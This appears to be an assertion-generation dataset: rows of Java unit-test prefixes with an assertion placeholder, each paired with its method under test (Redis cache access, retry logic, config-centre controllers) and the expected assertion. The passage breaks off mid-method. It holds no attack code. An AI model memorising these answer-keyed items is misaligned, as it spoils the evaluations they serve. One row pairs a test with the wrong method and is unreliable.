getUserByName(String name) { if (!cache.cacheEnable() || isBlank(name)) { return null; } String usernameKey = getUserNameKey(name);  RetryActionWithTwoParam<String, Class<User>, User> action = new RetryActionWithTwoParam<>( ""get"", retryTimes, usernameKey, User.class ); return action.action((String key, Class<User> type) -> cache.get(key, type)); }"	assertEquals(user, result)
"Exception { when(cache.cacheEnable()).thenReturn(true); Map<String, ApiEnvironmentVo> map = new HashMap<>(); map.put(""key"", apiEnvironmentVo); when(cache.<ApiEnvironmentVo>hgetall(anyString(), any())).thenReturn(map); List<ApiEnvironmentVo> result = rccCacheImpl.getEnvironments(Long.valueOf(1)); Assert.""<AssertPlaceHolder>""; }
getEnvironments(Long projectId) { if (!cache.cacheEnable() || projectId == null || projectId <= 0) { return null; } String environmentProjectIdKey = getEnvironmentProjectIdKey(projectId);  RetryActionWithTwoParam<String, Class<ApiEnvironmentVo>, Map<String, ApiEnvironmentVo>> action = new RetryActionWithTwoParam<>( ""hgetall"", retryTimes, environmentProjectIdKey, ApiEnvironmentVo.class ); Map<String, ApiEnvironmentVo> map = action.action((String key, Class<ApiEnvironmentVo> type) -> cache.hgetall(key, type)); if (isEmpty(map)) { return null; } return map.values().stream().filter(Objects :: nonNull).collect(Collectors.toList()); }"	assertEquals(apiEnvironmentVo, result.get(0))
"Exception { when(cache.cacheEnable()).thenReturn(true); when(cache.hget(anyString(), anyString(), any())) .thenReturn(envVo);  ApiEnvironmentVo result = rccCacheImpl.getEnvironment(Long.valueOf(1), ""name"");  Assert.""<AssertPlaceHolder>""; }
getEnvironment(Long projectId, String name) { if (!cache.cacheEnable() || projectId == null || projectId <= 0) { return null; } String environmentProjectIdKey = getEnvironmentProjectIdKey(projectId);  RetryActionWithThrParam<String, String, Class<ApiEnvironmentVo>, ApiEnvironmentVo> action = new RetryActionWithThrParam<>( ""hget"", retryTimes, environmentProjectIdKey, name, ApiEnvironmentVo.class ); return action .action((String hkey, String field, Class<ApiEnvironmentVo> type) -> cache.hget(hkey, field, type)); }"	assertEquals(envVo, result)
"Exception { when(cache.cacheEnable()).thenReturn(true); Map<String, ApiVersionVo> map = new HashMap<>(); map.put(""key"", apiVersionVo); when(cache.<ApiVersionVo>hgetall(anyString(), any())).thenReturn(map); List<ApiVersionVo> result = rccCacheImpl.getVersions(Long.valueOf(1)); Assert.""<AssertPlaceHolder>""; }
getVersions(Long environmentId) { if (!cache.cacheEnable() || environmentId == null || environmentId <= 0) { return null; } String versionEnvironmentIdKey = getVersionEnvironmentIdKey(environmentId);  RetryActionWithTwoParam<String, Class<ApiVersionVo>, Map<String, ApiVersionVo>> action = new RetryActionWithTwoParam<>( ""hgetall"", retryTimes, versionEnvironmentIdKey, ApiVersionVo.class ); Map<String, ApiVersionVo> map = action.action((String key, Class<ApiVersionVo> type) -> cache.hgetall(key, type)); if (isEmpty(map)) { return null; } return map.values().stream().filter(Objects :: nonNull).collect(Collectors.toList()); }"	assertEquals(apiVersionVo, result.get(0))
"Exception { when(cache.cacheEnable()).thenReturn(true); when(cache.hget(anyString(), anyString(), any())).thenReturn(apiVersionVo);  ApiVersionVo result = rccCacheImpl.getVersion(Long.valueOf(1), ""name""); Assert.""<AssertPlaceHolder>""; }
getVersion(Long environmentId, String name) { if (!cache.cacheEnable() || environmentId == null || environmentId <= 0) { return null; } String versionEnvironmentIdKey = getVersionEnvironmentIdKey(environmentId);  RetryActionWithThrParam<String, String, Class<ApiVersionVo>, ApiVersionVo> action = new RetryActionWithThrParam<>( ""hget"", retryTimes, versionEnvironmentIdKey, name, ApiVersionVo.class ); return action.action((String hkey, String field, Class<ApiVersionVo> type) -> cache.hget(hkey, field, type)); }"	assertEquals(apiVersionVo, result)
"Exception { when(cache.cacheEnable()).thenReturn(true); when(cache.get(anyString(), any())).thenReturn(apiVersionVo);  ApiVersionVo result = rccCacheImpl.getVersionById(Long.valueOf(1)); Assert.""<AssertPlaceHolder>""; }
getVersionById(Long versionId) { if (!cache.cacheEnable() || versionId == null || versionId <= 0) { return null; } String versionIdKey = getVersionIdKey(versionId); return new RetryActionWithTwoParam<String, Class<ApiVersionVo>, ApiVersionVo>( ""get"", retryTimes, versionIdKey, ApiVersionVo.class ).action((key, type) -> cache.get(key, type)); }"	assertEquals(apiVersionVo, result)
"Exception { when(cache.cacheEnable()).thenReturn(true); Map<String, ApiItemVo> map = new HashMap<>(); map.put(""key"", apiItemVo); when(cache.<ApiItemVo>hgetall(anyString(), any())).thenReturn(map);  List<ApiItemVo> result = rccCacheImpl.getItems(Long.valueOf(1)); Assert.""<AssertPlaceHolder>""; }
getItems(Long versionId) { if (!cache.cacheEnable() || versionId == null || versionId <= 0) { return null; } String itemVersionIdKey = getItemVersionIdKey(versionId);  RetryActionWithTwoParam<String, Class<ApiItemVo>, Map<String, ApiItemVo>> action = new RetryActionWithTwoParam<>( ""hgetall"", retryTimes, itemVersionIdKey, ApiItemVo.class ); Map<String, ApiItemVo> map = action.action((String key, Class<ApiItemVo> type) -> cache.hgetall(key, type)); if (isEmpty(map)) { return null; } return map.values().stream().filter(Objects :: nonNull).collect(Collectors.toList()); }"	assertEquals(apiItemVo, result.get(0))
"Exception { when(cache.cacheEnable()).thenReturn(true); Map<String, ApiItemVo> map = new HashMap<>(); map.put(""key"", apiItemVo); when(cache.<ApiItemVo>hmget(anyString(), any(), any())).thenReturn(map);  List<ApiItemVo> result = rccCacheImpl.getItems(Long.valueOf(1), Arrays.<String>asList(""String"")); Assert.""<AssertPlaceHolder>""; }
getItems(Long versionId, List<String> names) { if (!cache.cacheEnable() || versionId == null || versionId <= 0 || isEmpty(names)) { return null; } String itemVersionIdKey = getItemVersionIdKey(versionId);  RetryActionWithThrParam<String, List<String>, Class<ApiItemVo>, Map<String, ApiItemVo>> action = new RetryActionWithThrParam<>( ""hmget"", retryTimes, itemVersionIdKey, names, ApiItemVo.class ); Map<String, ApiItemVo> map = action.action( (String hkey, List<String> fields, Class<ApiItemVo> type) -> cache.hmget(hkey, fields, type)); if (isEmpty(map)) { return null; } return map.values().stream().filter(Objects :: nonNull).collect(Collectors.toList()); }"	assertEquals(apiItemVo, result.get(0))
"Exception { when(cache.cacheEnable()).thenReturn(true); when(cache.hget(anyString(), anyString(), any())).thenReturn(apiItemVo);  ApiItemVo result = rccCacheImpl.getItem(Long.valueOf(1), ""name""); Assert.""<AssertPlaceHolder>""; }
getItem(Long versionId, String name) { if (!cache.cacheEnable() || versionId == null || versionId <= 0) { return null; } String itemVersionIdKey = getItemVersionIdKey(versionId);  RetryActionWithThrParam<String, String, Class<ApiItemVo>, ApiItemVo> action = new RetryActionWithThrParam<>( ""hget"", retryTimes, itemVersionIdKey, name, ApiItemVo.class ); return action.action((String hkey, String field, Class<ApiItemVo> type) -> cache.hget(hkey, field, type)); }"	assertEquals(apiItemVo, result)
"Exception { boolean result = redisCache.cacheEnable(); Assert.""<AssertPlaceHolder>""; }
cacheEnable() { return cacheEnable; }"	assertEquals(true, result)
"Exception { when(redisTemplate.execute(any(RedisCallback.class))).thenAnswer( (InvocationOnMock invocation) -> { // Object[] args = invocation.getArguments(); return Arrays.asList(a); } ); List<String> result = redisCache.getByList(Arrays.asList(""key1""), String.class); Assert.""<AssertPlaceHolder>""; }
getByList(List<String> keys, Class<T> type) throws DataAccessException { if (CollectionUtils.isEmpty(keys)) { return null; } byte[][] keyf = new byte[keys.size()][]; for (int i = 0; i < keys.size(); i++) { byte[] keyb = keyPrefix.concat(keys.get(i)).getBytes(); keyf[i] = keyb; } return redisTemplate.execute((RedisConnection connection) -> { List<byte[]> values = connection.mGet(keyf); if (CollectionUtils.isEmpty(values)) { if (log.isDebugEnabled()) { log.debug(""the values of the keys {} is empty"", keys); } return null; } return values.stream().filter(Objects :: nonNull) .map((byte[] value) -> GsonUtils.toObject(value, type)) .collect(Collectors.toList());  }); }"	assertEquals(a, result.get(0))
"Exception { when(redisTemplate.execute(any(RedisCallback.class))).thenAnswer( invocation -> a ); String result = redisCache.get(""key"", String.class); Assert.""<AssertPlaceHolder>""; }
get(String key, Class<T> type) throws DataAccessException { if (isBlank(key)) { return null; } String keyString = keyPrefix.concat(key); return redisTemplate.execute((RedisConnection connection) -> { byte[] keyb = keyString.getBytes(); byte[] value = connection.get(keyb); if (value == null) { return null; } return GsonUtils.toObject(value, type); }); }"	assertEquals(a, result)
"Exception { when(redisTemplate.execute(any(RedisCallback.class))).thenAnswer( invocation -> 1L ); Long result = redisCache.getExpire(""key"", TimeUnit.NANOSECONDS); Assert.""<AssertPlaceHolder>""; }
getExpire(String key, TimeUnit timeUnit) throws DataAccessException { if (isBlank(key)) { return null; } String keyString = keyPrefix.concat(key); return redisTemplate.execute((RedisConnection connection) -> { byte[] keyb = keyString.getBytes(); try { return connection.pTtl(keyb, timeUnit); } catch (Exception e) { // Driver may not support pTtl or we may be running on Redis 2.4 return connection.ttl(keyb, timeUnit); } }); }"	assertEquals(Long.valueOf(1), result)
"Exception { when(redisTemplate.execute(any(RedisCallback.class))).thenAnswer( invocation -> Boolean.TRUE ); Boolean result = redisCache.put(""key"", ""value""); Assert.""<AssertPlaceHolder>""; }
put(String key, Object value) throws DataAccessException { return put(key, value, expireTime + random.nextInt(10)); }"	assertEquals(Boolean.TRUE, result)
"Exception { when(redisTemplate.execute(any(RedisCallback.class))).thenAnswer( invocation -> Boolean.TRUE ); Boolean result = redisCache.put(""key"", ""value"", Long.valueOf(1)); Assert.""<AssertPlaceHolder>""; }
put(String key, Object value, Long customerExpire) throws DataAccessException { if (isBlank(key)) { return Boolean.FALSE; } String keyString = keyPrefix.concat(key); final long liveTime = (customerExpire != null) ? customerExpire : expireTime; return redisTemplate.execute( (RedisConnection connection) -> { byte[] keyb = keyString.getBytes(); byte[] valueb = GsonUtils.toJsonBytes(value); if (liveTime > 0) { connection.setEx(keyb, liveTime, valueb); } else { connection.set(keyb, valueb); } return Boolean.TRUE; }); }"	assertEquals(Boolean.TRUE, result)
"Exception { when(redisTemplate.execute(any(RedisCallback.class))).thenAnswer( invocation -> Boolean.TRUE ); Boolean result = redisCache.hset(""key"", ""field"", ""value""); Assert.""<AssertPlaceHolder>""; }
hset(String key, String field, Object value) throws DataAccessException { if (isBlank(key) || isBlank(field)) { return Boolean.FALSE; } String keyString = keyPrefix.concat(key); return redisTemplate.execute( (RedisConnection connection) -> { byte[] keyb = keyString.getBytes(); byte[] fieldb = field.getBytes(); byte[] valueb = GsonUtils.toJsonBytes(value); return connection.hSet(keyb, fieldb, valueb); });  }"	assertEquals(Boolean.TRUE, result)
"Exception { when(redisTemplate.execute(any(RedisCallback.class))).thenAnswer( invocation -> Boolean.TRUE ); Boolean result = redisCache.hmset(""key"", new HashMap<String, Object>() {{ put(""String"", ""kvs""); }}); Assert.""<AssertPlaceHolder>""; }
put(String key, Object value) throws DataAccessException { return put(key, value, expireTime + random.nextInt(10)); }"	assertEquals(Boolean.TRUE, result)
"Exception { when(redisTemplate.execute(any(RedisCallback.class))).thenAnswer( invocation -> a ); String result = redisCache.hget(""key"", ""field"", String.class); Assert.""<AssertPlaceHolder>""; }
hget(String key, String field, Class<T> type) throws DataAccessException { if (isBlank(key) || isBlank(field)) { return null; } String keyString = keyPrefix.concat(key); return redisTemplate.execute( (RedisConnection connection) -> { byte[] keyb = keyString.getBytes(); byte[] fieldb = field.getBytes(); byte[] valueb = connection.hGet(keyb, fieldb); return GsonUtils.toObject(valueb, type); }); }"	assertEquals(a, result)
"Exception { when(redisTemplate.execute(any(RedisCallback.class))).thenAnswer( invocation -> { Map<String, String> map = new HashMap<>(); map.put(""key"", a); return map; } ); Map<String, String> result = redisCache.hmget(""key"", Arrays.asList(""String""), String.class); Assert.""<AssertPlaceHolder>""; }
hmget(String key, List<String> fields, Class<T> type) throws DataAccessException { if (isBlank(key) || CollectionUtils.isEmpty(fields)) { return null; } String keyString = keyPrefix.concat(key); return redisTemplate.execute( (RedisConnection connection) -> { byte[] keyb = keyString.getBytes(); byte[][] fieldsb = new byte[fields.size()][]; int i = 0; for (String f : fields) { fieldsb[i++] = f.getBytes(); } // 根据 fields的顺序返回， 如果filed对于的数据不存在， 返回null List<byte[]> valuebs = connection.hMGet(keyb, fieldsb); if (CollectionUtils.isEmpty(valuebs)) { return new HashMap<>(0); } Map<String, T> map = new HashMap<>(); for (int j = 0; j < fields.size(); j++) { String kj = fields.get(j); T vj = GsonUtils.toObject(valuebs.get(j), type); map.put(kj, vj); } return map; }); }"	"assertEquals(a, result.get(""key""))"
"Exception { when(redisTemplate.execute(any(RedisCallback.class))).thenAnswer( invocation -> { Map<String, String> map = new HashMap<>(); map.put(""key"", a); return map; } ); Map<String, String> result = redisCache.hgetall(""key"", String.class); Assert.""<AssertPlaceHolder>""; }
hgetall(String key, Class<T> type) throws DataAccessException { if (isBlank(key)) { return null; } String keyString = keyPrefix.concat(key); return redisTemplate.execute( (RedisConnection connection) -> { byte[] keyb = keyString.getBytes(); Map<byte[], byte[]> valuebs = connection.hGetAll(keyb); if (CollectionUtils.isEmpty(valuebs)) { return new HashMap<>(0); } Map<String, T> map = new HashMap<>(); for (Map.Entry<byte[], byte[]> entry : valuebs.entrySet()) { String hk = new String(entry.getKey()); T hv = GsonUtils.toObject(entry.getValue(), type); map.put(hk, hv); } return map; }); }"	"assertEquals(a, result.get(""key""))"
"Exception { when(redisTemplate.execute(any(RedisCallback.class))).thenAnswer( invocation -> Boolean.TRUE ); Boolean result = redisCache.hdel(""key"", ""field""); Assert.""<AssertPlaceHolder>""; }
hdel(String key, String field) throws DataAccessException { if (isBlank(key) || isBlank(field)) { return Boolean.FALSE; } String keyString = keyPrefix.concat(key); return redisTemplate.execute( (RedisConnection connection) -> { byte[] keyb = keyString.getBytes(); byte[] fieldb = field.getBytes(); connection.hDel(keyb, fieldb); return Boolean.TRUE; }); }"	assertEquals(Boolean.TRUE, result)
"Exception { when(redisTemplate.execute(any(RedisCallback.class))).thenAnswer( invocation -> Boolean.TRUE ); Boolean result = redisCache.hmdel(""key"", Arrays.asList(""String"")); Assert.""<AssertPlaceHolder>""; }
hmdel(String key, List<String> fields) throws DataAccessException { if (isBlank(key) || CollectionUtils.isEmpty(fields)) { return Boolean.FALSE; } String keyString = keyPrefix.concat(key); return redisTemplate.execute( (RedisConnection connection) -> { byte[] keyb = keyString.getBytes(); byte[][] fieldsb = new byte[fields.size()][]; int i = 0; for (String f : fields) { fieldsb[i++] = f.getBytes(); } connection.hDel(keyb, fieldsb); return Boolean.TRUE; }); }"	assertEquals(Boolean.TRUE, result)
"Exception { when(redisTemplate.execute(any(RedisCallback.class))).thenAnswer( invocation -> 1L ); Long result = redisCache.hDelByPrefix(""key"", ""fieldPrefix""); Assert.""<AssertPlaceHolder>""; }
hDelByPrefix(String key, String fieldPrefix) throws DataAccessException { if (isBlank(key) || isBlank(fieldPrefix)) { return 0L; } String keyString = keyPrefix.concat(key); byte[] cahceKey = keyString.getBytes(); return redisTemplate.execute( (RedisConnection connection) -> { Set<byte[]> keys = connection.hKeys(cahceKey); if (CollectionUtils.isEmpty(keys)) { if (log.isDebugEnabled()) { log.debug(""the cache {} is empty "" + keyString); } return 0L; } List<byte[]> needDelFieldList = new ArrayList<>(); for (byte[] hkey : keys) { String field = new String(hkey); if (field.startsWith(fieldPrefix)) { needDelFieldList.add(hkey); } }  final int needDelFieldLen = needDelFieldList.size(); byte[][] needDelField = new byte[needDelFieldLen][]; int i = 0; for (byte[] dkey : needDelFieldList) { needDelField[i] = dkey; i++; }  return connection.hDel(cahceKey, needDelField); }); }"	assertEquals(Long.valueOf(1), result)
"Exception { when(redisTemplate.execute(any(RedisCallback.class))).thenAnswer( invocation -> Boolean.TRUE ); Boolean result = redisCache.exists(""key""); Assert.""<AssertPlaceHolder>""; }
exists(String key) throws DataAccessException { if (isBlank(key)) { return Boolean.FALSE; } String keyString = keyPrefix.concat(key); return redisTemplate.execute( (RedisConnection connection) -> { byte[] keyb = keyString.getBytes(); return connection.exists(keyb); }); }"	assertEquals(Boolean.TRUE, result)
"Exception { RetryActionWithOneParam<String, R> retryActionWithOneParam = new RetryActionWithOneParam<>( ""print"", 3, ""a"" ); R result = retryActionWithOneParam.action( a -> { System.out.println(""p1 is "" + a); return R.ok(); } ); Assert.""<AssertPlaceHolder>""; }
action(Function<P, R> func) { int times = 0; do { times++; try { return func.apply(param); } catch (DataAccessException ex) { log.warn(""{} arg0[{}] in redis happen DataAccessException, times[{}]"", actionName, GsonUtils.toJsonString(param), times, ex ); } catch (Exception ex) { log.error(""{} arg0[{}] in redis fail."", actionName, GsonUtils.toJsonString(param), ex); break; } } while (times < retryTimes); return null; }"	assertEquals(0, result.getStatus())
"Exception { RetryActionWithOneParam<String, R> retryActionWithOneParam = new RetryActionWithOneParam<>( ""print"", 3, ""a"" ); R result = retryActionWithOneParam.action( a -> { throw new CannotAcquireLockException(""throw dae""); } ); Assert.""<AssertPlaceHolder>""; }
action(Function<P, R> func) { int times = 0; do { times++; try { return func.apply(param); } catch (DataAccessException ex) { log.warn(""{} arg0[{}] in redis happen DataAccessException, times[{}]"", actionName, GsonUtils.toJsonString(param), times, ex ); } catch (Exception ex) { log.error(""{} arg0[{}] in redis fail."", actionName, GsonUtils.toJsonString(param), ex); break; } } while (times < retryTimes); return null; }"	assertEquals(null, result)
"Exception { RetryActionWithOneParam<String, R> retryActionWithOneParam = new RetryActionWithOneParam<>( ""print"", 3, ""a"" ); R result = retryActionWithOneParam.action( a -> { throw new RuntimeException(""run time exception test""); } ); Assert.""<AssertPlaceHolder>""; }
action(Function<P, R> func) { int times = 0; do { times++; try { return func.apply(param); } catch (DataAccessException ex) { log.warn(""{} arg0[{}] in redis happen DataAccessException, times[{}]"", actionName, GsonUtils.toJsonString(param), times, ex ); } catch (Exception ex) { log.error(""{} arg0[{}] in redis fail."", actionName, GsonUtils.toJsonString(param), ex); break; } } while (times < retryTimes); return null; }"	assertEquals(null, result)
"Exception { RetryActionWithThrParam<String, String, String, R> retryActionWithThrParam = new RetryActionWithThrParam<>( ""print"", 3, ""a"", ""b"", ""c"" ); ThrFunction<String, String, String, R> thrFunction = (a, b, c) -> { System.out.println(""p1 is "" + a); System.out.println(""p2 is "" + b); System.out.println(""p3 is "" + c); return R.ok(); };  R result = retryActionWithThrParam.action(thrFunction); Assert.""<AssertPlaceHolder>""; }
action(ThrFunction<P1, P2, P3, R> func) { int times = 0; do { times++; try { return func.apply(p1, p2, p3); } catch (DataAccessException ex) { log.warn(""{} arg0[{}] arg1[{}] arg2[{}] in redis happen DataAccessException, times[{}]"", actionName, GsonUtils.toJsonString(p1), GsonUtils.toJsonString(p2), GsonUtils.toJsonString(p3), times, ex ); } catch (Exception ex) { log.error(""{} arg0[{}] arg1[{}] arg2[{}] in redis fail."", actionName, GsonUtils.toJsonString(p1), GsonUtils.toJsonString(p2), GsonUtils.toJsonString(p3), ex); break; } } while (times < retryTimes); return null; }"	assertEquals(0, result.getStatus())
"Exception { Pagination<User> pagination = mock(Pagination.class); when(pagination.getDataList()).thenReturn(Arrays.asList(mock(User.class))); when(userService.<User>pagination(any(), any(), anyVararg())).thenReturn(pagination); R result = adminController.queryUser(1, 20, UserRole.SYSADMIN.getValue(), ""name""); Assert.""<AssertPlaceHolder>""; }
queryUser(@RequestParam(value = ""pageNo"", defaultValue = ""1"") Integer pageNo, @RequestParam(value = ""pageSize"", defaultValue = ""20"") Integer pageSize, @RequestParam(value = ""userRole"", required = false) Byte userRole, @RequestParam(value = ""name"", defaultValue = """", required = false) String name) {  int offset = (pageNo - 1) * pageSize; Pagination<UserVo> pagination = userService.pagination( UserExample.newBuilder() .start(offset) .limit(pageSize) .build() .createCriteria() .andNameLikeBoth(name, StringUtils.isNotBlank(name)) .andStatusEqualTo(Deleted.OK.getValue()) .andRoleEqualTo(userRole, Objects.nonNull(userRole)) .toExample(), item -> { UserVo userVo = new UserVo(); userVo.setCreateTime(item.getCreateTime()); userVo.setUserId(item.getId()); userVo.setUserName(item.getName()); userVo.setStatus(item.getStatus()); userVo.setUserRole(item.getRole()); userVo.setUpdateTime(item.getUpdateTime()); return userVo; } ); return R.ok(pagination); }"	assertEquals(0, result.getStatus())
"Exception { R<Long> result = configItemController.saveItem(new ConfigItemReq(), null); Assert.""<AssertPlaceHolder>""; }
saveItem(@RequestBody ConfigItemReq req, @LoginUser User user) { if (user == null) { return R.error(NON_LOGIN_STATUS, NON_LOGIN_MSG); } Long id = req.getId(); String name = trim(req.getName()); Date now = DateTimeUtils.now(); Long cacheEvictVersionId = null; if (id != null && id > 0) { // 修改 ConfigItem configItem = configItemService.selectByPrimaryKey(id); if (configItem == null || Deleted.DELETE.getValue().equals(configItem.getDeleted())) { return R.error(CONFIG_ITEM_NOT_EXISTS_STATUS, CONFIG_ITEM_NOT_EXISTS_MSG); } if (!environmentUserService.checkAuth(configItem.getProductId(), configItem.getProjectId(), configItem.getEnvironmentId(), user)) { return R.error(PRIV_MIS_STATUS, PRIV_MIS_MSG); } ConfigItem update = new ConfigItem(); update.setId(id); update.setUpdateTime(now); String newName = configItem.getName(); if (isNotBlank(name)) { ConfigItem exists = configItemService.selectOneByExample(ConfigItemExample.newBuilder() .build() .createCriteria() .andIdNotEqualTo(id) .andNameEqualTo(name) .andVersionIdEqualTo(configItem.getVersionId()) .andDeletedEqualTo(Deleted.OK.getValue()) .toExample(), MetaConfigItem.COLUMN_NAME_ID ); if (exists != null) { return R.error(CONFIG_ITEM_EXISTS_STATUS, CONFIG_ITEM_EXISTS_MSG); } update.setName(name); newName = name; } update.setVal(trim(req.getVal())); update.setMemo(trim(req.getMemo()));  // 采集configChangeLog Long groupId = configItem.getGroupId(); Map<String, String> oldConfigMap = configItemService.findConfigItemsByGroupId(groupId);  // 更新 configItemService.updateByPrimaryKeySelective(update);  // 保存更新日志 Map<String, String> newConfigMap = new HashMap<>(); if (!CollectionUtils.isEmpty(oldConfigMap)) { newConfigMap.putAll(oldConfigMap); newConfigMap.remove(configItem.getName()); newConfigMap.put(newName, update.getVal()); } configChangeLogService.saveLogWithBackground(user.getId(), user.getName(), configItem.getGroupId(), oldConfigMap, newConfigMap, new Date());  cacheEvictVersionId = configItem.getVersionId(); } else { // 新增 Long groupId = req.getGroupId(); if (null == groupId || groupId <= 0) { return R.error(GROUP_ID_NOT_EXISTS_STATUS, GROUP_ID_NOT_EXISTS_MSG); } if (StringUtils.isBlank(name)) { return R.error(CONFIG_KEY_NOT_EXISTS_STATUS, CONFIG_KEY_NOT_EXISTS_MSG); } ConfigGroup configGroup = groupService.selectByPrimaryKey(groupId); if (configGroup == null || Deleted.DELETE.getValue().equals(configGroup.getDeleted())) { return R.error(GROUP_NOT_EXISTS_STATUS, GROUP_NOT_EXISTS_MSG); } if (!environmentUserService.checkAuth(configGroup.getProductId(), configGroup.getProjectId(), configGroup.getEnvironmentId(), user)) { return R.error(PRIV_MIS_STATUS, PRIV_MIS_MSG); } ConfigItem configItem = configItemService.selectOneByExample(ConfigItemExample.newBuilder() .build() .createCriteria() .andDeletedEqualTo(Deleted.OK.getValue()) .andGroupIdEqualTo(groupId) .andNameEqualTo(name) .toExample(), MetaConfigItem.COLUMN_NAME_ID ); if (configItem != null) { return R.error(CONFIG_ITEM_EXISTS_STATUS, CONFIG_ITEM_EXISTS_MSG); }  ConfigItem insert = ConfigItem.newBuilder() .createTime(now) .updateTime(now) .deleted(Deleted.OK.getValue()) .name(name) .memo(trim(req.getMemo())) .groupId(groupId) .versionId(configGroup.getVersionId()) .environmentId(configGroup.getEnvironmentId()) .projectId(configGroup.getProjectId()) .productId(configGroup.getProductId()) .val(trim(req.getVal())) .build();  // 采集configChangeLog Map<String, String> oldConfigMap = configItemService.findConfigItemsByGroupId(groupId);  configItemService.insertSelective(insert);  // 保存更新日志 Map<String, String> newConfigMap = new HashMap<>(); if (!CollectionUtils.isEmpty(oldConfigMap)) { newConfigMap.putAll(oldConfigMap); newConfigMap.put(insert.getName(), insert.getVal()); } configChangeLogService.saveLogWithBackground(user.getId(), user.getName(), groupId, oldConfigMap, newConfigMap, new Date());  cacheEvictVersionId = configGroup.getVersionId(); id = insert.getId(); }  if (cacheEvictVersionId != null && cacheEvictVersionId > 0) { Set<Long> resolved = new HashSet<>(); List<Long> versionIds = new ArrayList<>(); versionIds.add(cacheEvictVersionId); if (projectService.selectByPrimaryKey(groupService.selectByPrimaryKey(req.getGroupId()).getProjectId()).getProjectType().equals(ProjectType.PUBLIC.getValue())) { versionIds.addAll(versionService.getChildrenVersionById(cacheEvictVersionId, resolved)); } rccCache.evictConfigItem(versionIds); }  return R.ok(id); }"	assertEquals(NON_LOGIN_STATUS, result.getStatus())
"Exception { R result = environmentController.save(new EnvironmentReq(), null); Assert.""<AssertPlaceHolder>""; }
save(@RequestBody EnvironmentReq req, @LoginUser User user) { if (user == null) { return R.error(NON_LOGIN_STATUS, NON_LOGIN_MSG); } Long id = req.getId(); String name = trim(req.getName()); if (NameUtils.containsChinese(name)) { return R.error(CHINESE_NOT_ALLOWED_STATUS, CHINESE_NOT_ALLOWED_MSG); } Date now = DateTimeUtils.now();  Long cacheEvictProjectId = null; if (id != null && id > 0) { // 修改 Environment environment = environmentService.selectByPrimaryKey(id); if (environment == null || Deleted.DELETE.getValue().equals(environment.getDeleted())) { return R.error(ENVIRONMENT_NOT_EXISTS_STATUS, ENVIRONMENT_NOT_EXISTS_MSG); } if (!projectUserService.checkAuth(environment.getProductId(), environment.getProjectId(), user)) { return R.error(PRIV_MIS_STATUS, PRIV_MIS_MSG); } Environment update = new Environment(); update.setId(id); update.setUpdateTime(now); if (StringUtils.isNotBlank(name)) { Environment exists = environmentService.selectOneByExample(EnvironmentExample.newBuilder() .build() .createCriteria() .andIdNotEqualTo(id) .andNameEqualTo(name) .andProjectIdEqualTo(environment.getProjectId()) .andDeletedEqualTo(Deleted.OK.getValue()) .toExample(), MetaEnvironment.COLUMN_NAME_ID ); if (exists != null) { return R.error(ENVIRONMENT_EXISTS_STATUS, ENVIRONMENT_EXISTS_MSG); } update.setName(name); } update.setMemo(req.getMemo()); environmentService.updateByPrimaryKeySelective(update);  cacheEvictProjectId = environment.getProjectId(); } else { // 新增 Long projectId = req.getProjectId(); if (null == projectId || projectId <= 0) { return R.error(PROJECT_ID_NOT_EXISTS_STATUS, PROJECT_ID_NOT_EXISTS_MSG); } if (StringUtils.isBlank(name)) { return R.error(ENVIRONMENT_NAME_NOT_EMPTY_STATUS, ENVIRONMENT_NAME_NOT_EMPTY_MSG); } Project project = projectService.selectByPrimaryKey(projectId); if (project == null || Deleted.DELETE.getValue().equals(project.getDeleted())) { return R.error(PROJECT_NOT_EXISTS_STATUS, PROJECT_NOT_EXISTS_MSG); } if (!projectUserService.checkAuth(project.getProductId(), projectId, user)) { return R.error(PRIV_MIS_STATUS, PRIV_MIS_MSG); } Environment environment = environmentService.selectOneByExample(EnvironmentExample.newBuilder() .build() .createCriteria() .andDeletedEqualTo(Deleted.OK.getValue()) .andProjectIdEqualTo(projectId) .andNameEqualTo(name) .toExample(), MetaEnvironment.COLUMN_NAME_ID ); if (environment != null) { return R.error(ENVIRONMENT_EXISTS_STATUS, ENVIRONMENT_EXISTS_MSG); }  Environment insert = new Environment(); insert.setUpdateTime(now); insert.setCreateTime(now); insert.setDeleted(Deleted.OK.getValue()); insert.setName(name); insert.setMemo(req.getMemo()); insert.setProjectId(projectId); insert.setProductId(project.getProductId()); environmentService.insertSelective(insert); id = insert.getId();  cacheEvictProjectId = projectId; }  // 失效缓存 rccCache.evictEnvironment(cacheEvictProjectId);  return R.ok(id); }"	assertEquals(NON_LOGIN_STATUS, result.getStatus())
"Exception { R<Long> result = groupController.saveGroup(null, null); Assert.""<AssertPlaceHolder>""; }
saveGroup(@RequestBody ConfigGroupReq req, @LoginUser User user) { if (user == null) { return R.error(NON_LOGIN_STATUS, NON_LOGIN_MSG); } Long id = req.getId(); String name = trim(req.getName()); if (NameUtils.containsChinese(name)) { return R.error(CHINESE_NOT_ALLOWED_STATUS, CHINESE_NOT_ALLOWED_MSG); } Date now = DateTimeUtils.now(); if (id != null && id > 0) { // 修改 ConfigGroup configGroup = groupService.selectByPrimaryKey(id); if (configGroup == null || Deleted.DELETE.getValue().equals(configGroup.getDeleted())) { return R.error(GROUP_NOT_EXISTS_STATUS, GROUP_NOT_EXISTS_MSG); } if (!environmentUserService.checkAuth(configGroup.getProductId(), configGroup.getProjectId(), configGroup.getEnvironmentId(), user)) { return R.error(PRIV_MIS_STATUS, PRIV_MIS_MSG); } ConfigGroup update = new ConfigGroup(); update.setId(id); update.setUpdateTime(now); if (StringUtils.isNotBlank(name)) { ConfigGroup exists = groupService.selectOneByExample(ConfigGroupExample.newBuilder() .build() .createCriteria() .andIdNotEqualTo(id) .andNameEqualTo(name) .andVersionIdEqualTo(configGroup.getVersionId()) .andDeletedEqualTo(Deleted.OK.getValue()) .toExample(), MetaConfigGroup.COLUMN_NAME_ID ); if (exists != null) { return R.error(GROUP_EXISTS_STATUS, GROUP_EXISTS_MSG); } update.setName(name); } update.setMemo(req.getMemo()); groupService.updateByPrimaryKeySelective(update); } else { // 新增 Long versionId = req.getVersionId(); if (null == versionId || versionId <= 0) { return R.error(VERSION_ID_NOT_EXISTS_STATUS, VERSION_ID_NOT_EXISTS_MSG); } if (StringUtils.isBlank(name)) { return R.error(GROUP_NAME_NOT_EXISTS_STATUS, GROUP_NAME_NOT_EXISTS_MSG); } Version version = versionService.selectByPrimaryKey(versionId); if (version == null || Deleted.DELETE.getValue().equals(version.getDeleted())) { return R.error(VERSION_NOT_EXISTS_STATUS, VERSION_NOT_EXISTS_MSG); } if (!environmentUserService.checkAuth(version.getProductId(), version.getProjectId(), version.getEnvironmentId(), user)) { return 